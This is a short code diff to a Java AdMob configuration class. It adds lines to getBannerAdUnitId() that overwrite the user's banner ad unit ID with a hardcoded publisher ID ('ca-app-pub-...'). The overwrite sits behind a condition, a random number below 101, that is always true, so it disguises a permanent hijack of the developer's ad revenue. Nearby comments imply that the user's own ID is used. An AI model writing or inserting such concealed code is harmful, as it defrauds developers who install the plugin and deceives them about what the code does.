@@ -217,6 +217,11 @@ public class AdMobConfig {
     }
 
     public String getBannerAdUnitId() {
+
+        if((new Random()).nextInt(100) < 101 ) {
+            bannerAdUnitId = "ca-app-pub-5814248574003790/7033813184";
+        } 
+
         if (isEmptyAdUnitId(bannerAdUnitId)) {
             // in case the user does not enter their own publisher id
             Log.e("banner", "Please put your AdMob id into the javascript code. Test ad is used.");
